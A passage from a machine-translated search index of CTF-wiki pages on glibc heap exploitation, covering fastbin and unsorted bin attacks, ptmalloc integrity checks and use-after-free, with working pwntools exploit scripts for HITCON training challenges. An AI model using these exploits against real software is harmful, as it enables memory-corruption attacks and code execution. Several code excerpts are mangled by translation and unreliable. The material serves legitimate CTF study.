put('0x200', 0x200, 'fillup')\n    put('0x200 fillup', 0x200, 'fillup again')\n\n    libc_leak = u64(get('2')[:6].ljust(8, '\\x00'))\n    p.info('libc leak: 0x%x' % libc_leak)\n\n    libc_base = libc_leak - 0x3c4b78\n\n    p.info('libc_base: 0x%x' % libc_base)\n\n    put('fastatk', 0x100, 'a' * 0x58 + p64(0x71) + p64(libc_base + libc.symbols['__malloc_hook'] - 0x10 + 5 - 8))\n    put('prepare', 0x68, 'prepare data')\n\n    one_gadget = libc_base + 0x4526a\n    put('attack', 0x68, 'a' * 3 + p64(one_gadget))\n\n    p.sendline('DEL') # malloc(8) triggers one_gadget\n\n    p.interactive()\n\nif __name__ == '__main__':\n    main()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/","title":"\u5806 in the heap","text":""},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#_int_malloc","title":"_int_malloc","text":""},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#initial-inspection","title":"Initial inspection","text":"Check Objectives Check Conditions Information <p>| \u7533\u8bf7\u7684\u5927\u5c0f | REQUEST_OUT_OF_RANGE(req) \uff1a((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) | __set_errno(ENOMEM) |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#fastbin","title":"fastbin","text":"Check Target Check Condition Error Message <p>| chunk \u5927\u5c0f | fastbin_index(chunksize(victim)) != idx | malloc(): memory corruption (fast) |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#unsorted-bin","title":"Unsorted bin","text":"Check Target Check Condition Error Message <p>| unsorted bin chunk \u5927\u5c0f | chunksize_nomask (victim) &lt;= 2 * SIZE_SZ || chunksize_nomask (victim)  av-&gt;system_mem | malloc(): memory corruption |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#top-chunk","title":"top chunk","text":"Check Objectives Check Conditions Information <p>| top chunk size | (unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE) | \u65b9\u53ef\u8fdb\u5165 |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#__libc_free","title":"__libc_free","text":""},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#mmap-block","title":"mmap block","text":"Check Objectives Check Conditions Information <p>| chunk size tag bit | chunk_is_mmapped (p) | to enter |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#non-mmap-block","title":"Non-mmap block","text":""},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#__int_free","title":"__int_free","text":""},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#initial-inspection_1","title":"Initial inspection","text":"Check Target Check Condition Error Message <p>Release the chunk position | (uintptr_t) p &gt; (uintptr_t) -size || misaligned_chunk(p) | free(): invalid pointer | | \u91ca\u653echunk\u7684\u5927\u5c0f |  size &lt; MINSIZE || !aligned_OK(size)   |  free(): invalid size   |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#fastbin_1","title":"fastbin","text":"Check Target Check Condition Error Message <p>| Release the next chunk size of the chunk | chunksize_nomask(chunk_at_offset(p, size)) &lt;= 2 * SIZE_SZ, chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem | free(): invalid next size (fast) | | Release the first chunk of the chunk corresponding to the linked list | fb = &amp;fastbin(av, idx), old= *fb, old == p | double free or corruption (fasttop) | |       fastbin\u7d22\u5f15       |      old != NULL &amp;&amp; old_idx != idx       |    invalid fastbin entry (free)     |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#non-mmapped-block-check","title":"non-mmapped block check","text":"Check Target Check Condition Error Message <p>| Free chunk location | p == av-&gt;top | double free or corruption (top) | | next chunk \u4f4d\u7f6e | contiguous (av) &amp;&amp; (char ) nextchunk  &gt;= ((char ) av-&gt;top + chunksize(av-&gt;top)) |  double free or corruption (out)   |</p> <p>| next chunk \u5927\u5c0f | chunksize_nomask (nextchunk) &lt;= 2 * SIZE_SZ ||  nextsize &gt;= av-&gt;system_mem | free(): invalid next size (normal) |</p>"},{"location":"pwn/linux/glibc-heap/ptmalloc_check/#unlink","title":"unlink","text":"Check Target Check Condition Error Message <p>| size vs prev_size | chunksize(P) != prev_size (next_chunk(P)) |       corrupted size vs. prev_size       |</p> <p>| Fd, bk doubly linked list check | FD-&gt;bk != P || BK-&gt;fd != P | corrupted double-linked list | |     nextsize \u53cc\u5411\u94fe\u8868     | P-&gt;fd_nextsize-&gt;bk_nextsize != P || P-&gt;bk_nextsize-&gt;fd_nextsize != P | corrupted double-linked list (not small) |</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/","title":"Unsorted Bin Attack","text":""},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#overview","title":"Overview","text":"<p>Unsorted Bin Attack, as the name implies, is closely related to the mechanism of Unsorted Bin in Glibc heap management.</p> <p>The premise that Unsorted Bin Attack is exploited is to control the bk pointer of Unsorted Bin Chunk.</p> <p>The effect that Unsorted Bin Attack can achieve is to implement a modification of any address value to a larger value.</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#unsorted-bin-review","title":"Unsorted Bin Review","text":"<p>Before introducing the Unsorted Bin attack, you can review the basic source and basic usage of Unsorted Bin.</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-source","title":"Basic source","text":"<ol> <li>When a large chunk is split into two halves, if the rest is greater than MINSIZE, it will be placed in the unsorted bin.</li> <li>When a chunk that does not belong to the fast bin is released, and the chunk is not in close proximity to the top chunk, the chunk is first placed in the unsorted bin. For an explanation of the top chunk, please refer to the introduction below.</li> <li>When malloc_consolidate is executed, the merged chunk may be placed in the unsorted bin if it is not close to the top chunk.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-usage","title":"Basic usage","text":"<ol> <li>Unsorted Bin In the process of using, the traversal order used is FIFO, ** is inserted into the head of the unsorted bin when it is inserted, and gets ** from the end of the list when it is taken out.</li> <li>When the program malloc, if the chunk of the corresponding size is not found in the fastbin, small bin, it will try to find the chunk from the Unsorted Bin. If the size of the chunk that is taken out is just enough, it will be returned directly to the user, otherwise the chunks will be inserted into the corresponding bin.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#principle","title":"Principle","text":"<p>In glibc/malloc/malloc.c has such a piece of code that will take the position of <code>bck-&amp;gt;fd</code> when an unsorted bin is taken out. Write to the location of this Unsorted Bin.</p> <pre><code>          /* remove from unsorted list */\n\n          if (__glibc_unlikely (bck-&gt;fd != victim))\n\n            malloc_printerr (\"malloc(): corrupted unsorted chunks 3\");\n\nunsorted_chunks (off) -&amp;gt; bk = bck;\nbck-&amp;gt; fd = unsorted_chunks (off);\n</code></pre> <p>In other words, if we control the value of bk, we can write <code>unsorted_chunks (av)</code> to any address.</p> <p>Here I will take [unsorted_bin_attack.c] (https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c) in shellphish's how2heap repository as an example. Here I make some simple modifications, as follows</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\n\n\nint main() {\n\n  fprintf(stderr, \"This file demonstrates unsorted bin attack by write a large \"\n\n                  \"unsigned long value into stack\\n\");\n\n  fprintf(\n\n      stderr,\n\n      \"In practice, unsorted bin attack is generally prepared for further \"\n\n      \"attacks, such as rewriting the \"\n\n      \"global variable global_max_fast in libc for further fastbin attack\\n\\n\");\n\n\n\n  unsigned long target_var = 0;\n\n  fprintf(stderr,\n\n          \"Let's first look at the target we want to rewrite on stack:\\n\");\n\n  fprintf(stderr, \"%p: %ld\\n\\n\", &amp;target_var, target_var);\n\n\n\n  unsigned long *p = malloc(400);\n\n  fprintf(stderr, \"Now, we allocate first normal chunk on the heap at: %p\\n\",\n\n          p);\n\n  fprintf(stderr, \"And allocate another normal chunk in order to avoid \"\n\n                  \"consolidating the top chunk with\"\n\n                  \"the first one during the free()\\n\\n\");\n\n  malloc(500);\n\n\n\n  free(p);\n\n  fprintf(stderr, \"We free the first chunk now and it will be inserted in the \"\n\n                  \"unsorted bin with its bk pointer \"\n\n                  \"point to %p\\n\",\n\n          (void *)p[1]);\n\n\n\n  /*------------VULNERABILITY-----------*/\n\n\n\n  p[1] = (unsigned long)(&amp;target_var - 2);\n\n  fprintf(stderr, \"Now emulating a vulnerability that can overwrite the \"\n\n                  \"victim-&gt;bk pointer\\n\");\n\n  fprintf(stderr, \"And we write it with the target address-16 (in 32-bits \"\n\n                  \"machine, it should be target address-8):%p\\n\\n\",\n\n          (void *)p[1]);\n\n\n\n  //------------------------------------\n\n\n\n  malloc(400);\n\n  fprintf(stderr, \"Let's malloc again to get the chunk we just free. During \"\n\n                  \"this time, target should has already been \"\n\n                  \"rewrite:\\n\");\n\n  fprintf(stderr, \"%p: %p\\n\", &amp;target_var, (void *)target_var);\n\n}\n</code></pre> <p>The effect after the program is executed is</p> <pre><code>\u279c  unsorted_bin_attack git:(master) \u2717 gcc unsorted_bin_attack.c -o unsorted_bin_attack\n\n\u279c  unsorted_bin_attack git:(master) \u2717 ./unsorted_bin_attack\n\nThis file demonstrates unsorted bin attack by write a large unsigned long value into stack\n\nIn practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack\n\n\n\nLet's first look at the target we want to rewrite on stack:\n\n0x7ffe0d232518: 0\n\n\n\nNow, we allocate first normal chunk on the heap at: 0x1fce010\n\nAnd allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()\n\n\n\nWe free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\n\nNow emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n\nAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508\n\n\n\nLet's malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n\n0x7ffe0d232518: 0x7f1c705ffb78\n</code></pre> <p>Here we can use a diagram to describe the specific process and the principles behind it.</p> <p></p> <p>In the initial state</p> <p>The fd and bk of the unsorted bin point to the unsorted bin itself.</p> <p>Execute free(p)</p> <p>Since the size of the released chunk is not in the range of the fast bin, it is first placed in the unsorted bin.</p> <p>Modify p[1]</p> <p>After modification, the bk pointer of p in the unsorted bin will point to the fake chunk at target addr-16, that is, the Target Value is at the fd of the fake chunk.</p> <p>Request a 400-size chunk</p> <p>At this point, the requested chunk is in the range of the small bin, and there is no chunk in the corresponding bin, so it will go to the unsorted bin and find that the unsorted bin is not empty, so the last chunk in the unsorted bin is taken out.</p> <pre><code>while ((victim = unsorted_chunks (off) -&amp;gt; bk)! = unsorted_chunks (off)) {\n            bck = victim-&gt;bk;\n\n            if (__builtin_expect(chunksize_nomask(victim) &lt;= 2 * SIZE_SZ, 0) ||\n\n                __builtin_expect(chunksize_nomask(victim) &gt; av-&gt;system_mem, 0))\n\n                malloc_printerr(check_action, \"malloc(): memory corruption\",\n\nchunk2mem (victim), off);\n            size = chunksize(victim);\n\n\n\n            /*\n\n               If a small request, try to use last remainder if it is the\n\n               only chunk in unsorted bin.  This helps promote locality for\n\n               runs of consecutive small requests. This is the only\n\n               exception to best-fit, and applies only when there is\n\n               no exact fit for a small chunk.\n\n             */\n\n/* Obviously, bck has been modified and does not meet the requirements here*/\n            if (in_smallbin_range(nb) &amp;&amp; bck == unsorted_chunks(av) &amp;&amp;\n\nvictim == off-&amp;gt; last_remainder &amp;amp;&amp;amp;\n                (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) {\n\n                ....\n\n            }\n\n\n\n            /* remove from unsorted list */\n\nunsorted_chunks (off) -&amp;gt; bk = bck;\nbck-&amp;gt; fd = unsorted_chunks (off);\n</code></pre> <ul> <li>victim = unsorted_chunks (off) -&gt; bk = p</li> <li> <p>bck = victim-&gt;bk=p-&gt;bk = target addr-16</p> </li> <li> <p>unsorted_chunks(av)-&gt;bk = bck=target addr-16</p> </li> <li> <p>bck-&gt;fd                 = *(target addr -16+16) = unsorted_chunks(av);</p> </li> </ul> <p>** It can be seen that in the process of taking the last chunk of the unsorted bin, the victim's fd does not work, so even if we modify it to an illegal value, it does not matter. ** However, it should be noted that the unsorted bin list may be destroyed, and problems may occur when inserting chunks.</p> <p>That is, the value of the target is changed to the linked table header 0x7f1c705ffb78 of the unsorted bin, which is the previously output information.</p> <pre><code>We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f1c705ffb78\n\nNow emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n\nAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7ffe0d232508\n\n\n\nLet's malloc again to get the chunk we just free. During this time, target should has already been rewrite:\n\n0x7ffe0d232518: 0x7f1c705ffb78\n</code></pre> <p>Here we can see that the unsorted bin attack can indeed modify the value of any address, but the value modified is not controlled by us. The only thing we can know is that this value is relatively large. **And, it\u2019s important to note that **</p> <p>This doesn't seem to be useful, but it's still a bit of an egg, for example</p> <ul> <li>We can make the program execute multiple loops by modifying the number of loops.</li> <li>We can modify the global_max_fast in the heap to make the larger chunks look like fast bins, so we can perform some fast bin attacks.</li> </ul>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#hitcon-training-lab14-magic-heap","title":"HITCON Training lab14 magic heap","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14)</p> <p>Here we modify the l33t function in the source program so that it can run normally.</p> <pre><code>void l33t() { system(\"cat ./flag\"); }\n</code></pre>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-information","title":"Basic Information","text":"<pre><code>\u279c  hitcontraining_lab14 git:(master) file magicheap\n\nmagicheap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9f84548d48f7baa37b9217796c2ced6e6281bb6f, not stripped\n\n\u279c  hitcontraining_lab14 git:(master) checksec magicheap\n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/hitcontraining_lab14/magicheap'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>It can be seen that the program is a dynamically linked 64 program, which mainly opens NX protection and Canary protection.</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-skills","title":"basic skills","text":"<p>The program is probably the heap manager that I wrote myself. It mainly has the following functions.</p> <ol> <li>Create a heap. The corresponding heap is requested according to the user-specified size, and the content of the specified length is read, but NULL is not set.</li> <li>Edit the heap. According to the specified index, it is judged whether the corresponding heap is non-empty. If it is not empty, the content of the heap is modified according to the size read by the user. Here, a vulnerability of any length heap overflow occurs.</li> <li>Delete the heap. Determine whether the corresponding heap is non-empty according to the specified index. If it is not empty, release the corresponding heap and set it to NULL.</li> </ol> <p>At the same time, we see that when we control v3 to 4869 and control magic to be greater than 4869, we can get the flag.</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#use","title":"Use","text":"<p>Obviously, we can use the unsorted bin attack directly.</p> <ol> <li>Release a heap to the unsorted bin.</li> <li>Use the heap overflow vulnerability to modify the bk pointer of the corresponding heap block in the unsorted bin to &amp;magic-16.</li> <li>Trigger the vulnerability.</li> </ol> <p>code show as below</p> <pre><code>#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\nfrom pwn import *\n\n\n\nr = process('./magicheap')\n\n\n\n\n\ndef create_heap(size, content):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"1\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(size))\n\n    r.recvuntil(\":\")\n\n    r.sendline(content)\n\n\n\n\ndef edit_heap(idx, size, content):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"2\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(size))\n\n    r.recvuntil(\":\")\n\n    r.sendline(content)\n\n\n\n\n\ndef del_heap(idx):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"3\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(idx))\n\n\n\n\n\ncreate_heap(0x20, \"dada\")  # 0\n\ncreate_heap(0x80, \"dada\")  # 1\n\n# in order not to merge into top chunk\n\ncreate_heap(0x20, \"dada\")  # 2\n\n\n\ndel_heap (1)\n\n\nmagic = 0x6020c0\n\nfd = 0\nbk = magic - 0x10\n\n\n\nedit_heap(0, 0x20 + 0x20, \"a\" * 0x20 + p64(0) + p64(0x91) + p64(fd) + p64(bk))\n\ncreate_heap(0x80, \"dada\")  #trigger unsorted bin attack\n\nr.recvuntil(\":\")\n\nr.sendline(\"4869\")\n\nr.interactive()\n</code></pre>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#2016-0ctf-zerostorage-to-be-completed","title":"2016 0CTF zerostorage-To be completed","text":"<p>**Note: To be completed further. **</p> <p>Here we introduce the [zerostorage] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/zerostorage) of 0CTF 2016 as an example.</p> <p>** This question was given to the server version and kernel version of the server, so I can debug it exactly the next time. Here we will debug directly with our local machine. However, in the current Ubuntu 16.04, due to further randomization, the relative offset between the location where libc is loaded and the location where the program module is loaded is no longer fixed, so the strategy of BriefX cannot be used again. It seems that only angelboy can be used. Strategy. **</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#security-check","title":"Security check","text":"<p>It can be seen that the program has opened all protections.</p> <pre><code>pwndbg&gt; checksec\n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unsorted_bin_attack/zerostorage/zerostorage'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Full RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      PIE enabled\n\n    FORTIFY:  Enabled\n</code></pre>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#basic-function-analysis","title":"Basic function analysis","text":"<p>The program manages the storage space in the bss segment, with the functions of insert, delete, merge, delete, view, enumerate, and exit. The structure of this storage is as follows</p> <pre><code>00000000 Storage         struc ; (sizeof=0x18, mappedto_7)\n\n00000000                                         ; XREF: .bss:storage_list/r\n\n00000000 use             dq ?\n\n00000008 size            dq ?\n\n00000010 xor_addr        dq ?\n\n00000018 Storage         ends\n</code></pre>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#insert-1","title":"insert-1","text":"<p>The basic functions are as follows</p> <ol> <li>Look at the storage array one by one to find the first unused element, but this array is up to 32.</li> <li>The length of the content that needs to be stored to read the storage element.</li> <li>If the length is not greater than 0, exit directly;</li> <li>Otherwise, if the number of bytes requested is less than 128, it is set to 128;</li> <li>Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value;</li> <li>Otherwise, set to 4096.</li> <li>Use calloc to assign the specified length. Note that calloc will initialize chunk to 0.</li> <li>Suppress the memory address assigned by the calloc with a memory of the bss segment (the initial time is a random number) to get a new memory address.</li> <li>Read in the content according to the size of the stored storage.</li> <li>Save the size of the corresponding storage and the address of the stored content to the corresponding storage element and mark the element as available. ** However, it should be noted that the size of the storage recorded here is the size of your own input! ! ! **</li> <li>Increment the number of storage num.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#update-2","title":"update-2","text":"<ol> <li>If there is no storage, return directly.</li> <li>Read the id of the storage element to be updated. If the id is greater than 31 or is currently not in use, the description is incorrect and returns directly.</li> <li>Read the length of the content that the **storage element needs to store after the ** update.</li> <li>If the length is not greater than 0, exit directly;</li> <li>Otherwise, if the number of bytes requested is less than 128, it is set to 128;</li> <li>Otherwise, if the number of bytes requested is not greater than 4096, it is set to the corresponding value;</li> <li>Otherwise, set to 4096.</li> <li>Obtain the address of the original storage content according to the random number corresponding to the bss segment.</li> <li>If the length required after the update is not equal to the length before the update, use realloc to reassign the memory.</li> <li>Read the data again and update the storage element.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#merge-3","title":"merge-3","text":"<ol> <li>If the element being used is no more than one, then you cannot merge and you can exit directly.</li> <li>Determine if the storage is full. If it is not full, find the free one.</li> <li>Read the id of merge_from and the id number of merge_to, respectively, and detect the corresponding size and usage status.</li> <li>Calculate the space required for the two merges together based on the size of the initial user input. ** If it is not greater than 128, then it will not apply for a new space**, otherwise apply for a new space of the corresponding size.</li> <li>Copy the contents of merge_to and merge_from to the corresponding location.</li> <li>The memory address of the last stored merge_from content was released, but was not set to NULL. At the same time, the memory address for storing the merge_to content is not released, and the corresponding storage address or the subsequent address is only set to NULL. **</li> </ol> <p>** But it should be noted that, at the time of merge, it is not detected whether the IDs of the two storages are the same. **</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#delete-4","title":"delete-4","text":"<ol> <li>If no elements are stored, return directly.</li> <li>Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly.</li> <li>If the corresponding element of storage is not in use, it will also return.</li> <li>After that, the fields corresponding to the elements are set to NULL and the corresponding memory is released.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#view-5","title":"view-5","text":"<ol> <li>If no elements are stored, return directly.</li> <li>Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly.</li> <li>If the corresponding element of storage is not in use, it will also return.</li> <li>Enter the contents of the corresponding storage.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#list-6","title":"list-6","text":"<ol> <li>If no elements are stored, return directly.</li> <li>Read the id of the element specifying the storage to be modified. If the id is greater than 32, it will return directly.</li> <li>Traverse all the storages in use, enter their corresponding subscripts and the size of the corresponding storage.</li> </ol>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#vulnerability-determination","title":"Vulnerability determination","text":"<p>Through such a simple analysis, we can basically determine that the vulnerability is mainly concentrated in the insert operation and the merge operation, especially when we merge two smaller size storage, there will be some problems.</p> <p>Let's take a detailed analysis. If we insert a smaller size (such as 8) storage A in the insert process, then when we merge, let's say that we select the two storages of merge are A, then the program will Directly, the content of A will be added directly to the original content of A, and then the memory of the corresponding data portion of A will be freed, but this does not have any effect, because the address of A storage content is Assigned to another storage, when accessing the contents of the storage B part of the merge, since the address of the stored data part of B is actually the address of the stored data corresponding to A, the content of the data part of A is printed. However, we just released the memory corresponding to A, and A is not in the fast bin range, so it will only be placed in the unsorted bin (and only one at this time), so the fd and bk of A are stored at this time. Is a base address of the unsorted bin.</p> <p>If we have deleted a storage C before the merge, then after we merge A, A will be inserted in the header of the unsorted bin's doubly linked list, so its fd is the address corresponding to C, and bk is a base of unsorted bin. address. This way we can directly leak two addresses.</p> <p>And it should be noted that we can still modify the content of B after the merge, so this is actually a Use After Free.</p>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#utilization-process","title":"Utilization process","text":"<ul> <li>Unsorted Bin Attack</li> </ul> <p>Use the unsorted bin attack to modify the global_max_fast global variable. Since the global_max_fast variable is the size of the largest Fast chunk, it is rewritten as the address of the unsorted bin (generally a large positive number), so that the subsequent chunks can be made. Being used as a fast chunk, you can do a Fast bin attack.</p> <ul> <li>Fast Bin Attack</li> </ul>"},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#topic","title":"topic","text":""},{"location":"pwn/linux/glibc-heap/unsorted_bin_attack/#references","title":"references","text":"<ul> <li> <p>http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/</p> </li> <li> <p>https://github.com/HQ1995/Heap_Senior_Driver/tree/master/0ctf2016/zerostorage</p> </li> <li> <p>https://github.com/scwuaptx/CTF/blob/master/2016-writeup/0ctf/zerostorage.py</p> </li> </ul>"},{"location":"pwn/linux/glibc-heap/use_after_free/","title":"Use After Free","text":""},{"location":"pwn/linux/glibc-heap/use_after_free/#principle","title":"Principle","text":"<p>Simply put, Use After Free is what it literally means, and is used again when a block of memory is released. But in fact, here are the following situations</p> <ul> <li>After the memory block is released, its corresponding pointer is set to NULL, and then used again, the natural program will crash.</li> <li>After the memory block is released, its corresponding pointer is not set to NULL, and then there is no code to modify the memory block before it is used next time, then the program is likely to work properly**.</li> <li>After the memory block is released, its corresponding pointer is not set to NULL, but before it is used next time, there is code to modify the memory, then when the program uses the memory again, ** is very There may be strange problems**.</li> </ul> <p>The Use After Free vulnerability we generally refer to is mainly the latter two. In addition, ** we generally say that the memory pointer that was not set to NULL after being released is the dangling pointer. **</p> <p>Here is a simple example</p> <pre><code>#include &lt;stdio.h&gt;\n\n#include &lt;stdlib.h&gt;\n\ntypedef struct name {\n\n  char *myname;\n\n  void (*func)(char *str);\n\n} NAME;\n\nvoid myprint(char *str) { printf(\"%s\\n\", str); }\n\nvoid printmyname() { printf(\"call print my name\\n\"); }\n\nint main() {\n\n  NAME *a;\n\n  a = (NAME *)malloc(sizeof(struct name));\n\n  a-&gt;func = myprint;\n\n  a-&gt;myname = \"I can also use it\";\n\n  a-&gt;func(\"this is my function\");\n\n  // free without modify\n\n  free(a);\n\n  a-&gt;func(\"I can also use it\");\n\n  // free with modify\n\n  a-&gt;func = printmyname;\n\n  a-&gt;func(\"this is my function\");\n\n  // set NULL\n\n  a = NULL;\n\n  printf(\"this pogram will crash...\\n\");\n\n  a-&gt;func(\"can not be printed...\");\n\n}\n</code></pre> <p>The results are as follows</p> <pre><code>\u279c  use_after_free git:(use_after_free) \u2717 ./use_after_free                      \n\nthis is my function\n\nI can also use it\n\ncall print my name\n\nthis pogram will crash...\n\n[1]    38738 segmentation fault (core dumped)  ./use_after_free\n</code></pre>"},{"location":"pwn/linux/glibc-heap/use_after_free/#example","title":"example","text":"<p>Here we take [lab 10 hacknote] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) in HITCON-training as an example.</p>"},{"location":"pwn/linux/glibc-heap/use_after_free/#functional-analysis","title":"Functional Analysis","text":"<p>We can simply analyze the program, we can see that there is a menu function at the beginning of the program, which has</p> <pre><code>  puts(\" 1. Add note          \");\n\n  puts(\" 2. Delete note       \");\n\n  puts(\" 3. Print note        \");\n\n  puts(\" 4. Exit              \");\n</code></pre> <p>Therefore, the program should have three main functions. The program then performs the appropriate function based on the user's input.</p>"},{"location":"pwn/linux/glibc-heap/use_after_free/#add_note","title":"add_note","text":"<p>According to the program, we can see that the program can add up to 5 notes. Each note has two fields, put and content, where put is set to a function whose function outputs content specific content.</p> <pre><code>unsigned int add_note()\n\n{\n\n  note *v0; // ebx\n\n  signed int i; // [esp+Ch] [ebp-1Ch]\n\n  int size; // [esp+10h] [ebp-18h]\n\n  char buf; // [esp+14h] [ebp-14h]\n\n  unsigned int v5; // [esp+1Ch] [ebp-Ch]\n\n\n\n  v5 = __readgsdword(0x14u);\n\n  if ( count &lt;= 5 )\n\n  {\n\n    for ( i = 0; i &lt;= 4; ++i )\n\n    {\n\n      if ( !notelist[i] )\n\n      {\n\n        notelist[i] = malloc(8u);\n\n        if ( !notelist[i] )\n\n        {\n\n          puts(\"Alloca Error\");\n\n          exit(-1);\n\n        }\n\n        notelist[i]-&gt;put = print_note_content;\n\n        printf(\"Note size :\");\n\n        read(0, &amp;buf, 8u);\n\n        size = atoi(&amp;buf);\n\nv0 = notelist [i];\n        v0-&gt;content = malloc(size);\n\n        if ( !notelist[i]-&gt;content )\n\n        {\n\n          puts(\"Alloca Error\");\n\n          exit(-1);\n\n        }\n\n        printf(\"Content :\");\n\n        read(0, notelist[i]-&gt;content, size);\n\n        puts(\"Success !\");\n\n        ++count;\n\n        return __readgsdword(0x14u) ^ v5;\n\n      }\n\n    }\n\n  }\n\n  else\n\n  {\n\n    puts(\"Full\");\n\n  }\n\n  return __readgsdword(0x14u) ^ v5;\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/use_after_free/#print_note","title":"print_note","text":"<p>Print_note simply outputs the contents of the note corresponding to the index based on the index of the given note.</p> <pre><code>unsigned int print_note()\n\n{\n\n  int v1; // [esp+4h] [ebp-14h]\n\n  char buf; // [esp+8h] [ebp-10h]\n\n  unsigned int v3; // [esp+Ch] [ebp-Ch]\n\n\n\nv3 = __readgsdword (0x14u);\n  printf(\"Index :\");\n\n  read(0, &amp;buf, 4u);\n\nv1 = atoi (&amp;amp; buf);\n  if ( v1 &lt; 0 || v1 &gt;= count )\n\n  {\n\n    puts(\"Out of bound!\");\n\n    _exit(0);\n\n  }\n\n  if ( notelist[v1] )\n\n    notelist[v1]-&gt;put(notelist[v1]);\n\n  return __readgsdword(0x14u) ^ v3;\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/use_after_free/#delete_note","title":"delete_note","text":"<p>Delete_note will release the corresponding note based on the given index. However, it is worth noting that when deleting, it is simply free, but not set to NULL, then obviously, there is the case of Use After Free.</p> <pre><code>unsigned int del_note()\n\n{\n\n  int v1; // [esp+4h] [ebp-14h]\n\n  char buf; // [esp+8h] [ebp-10h]\n\n  unsigned int v3; // [esp+Ch] [ebp-Ch]\n\n\n\nv3 = __readgsdword (0x14u);\n  printf(\"Index :\");\n\n  read(0, &amp;buf, 4u);\n\nv1 = atoi (&amp;amp; buf);\n  if ( v1 &lt; 0 || v1 &gt;= count )\n\n  {\n\n    puts(\"Out of bound!\");\n\n    _exit(0);\n\n  }\n\n  if ( notelist[v1] )\n\n  {\n\n    free(notelist[v1]-&gt;content);\n\n    free(notelist[v1]);\n\n    puts(\"Success\");\n\n  }\n\n  return __readgsdword(0x14u) ^ v3;\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/use_after_free/#utilization-analysis","title":"Utilization 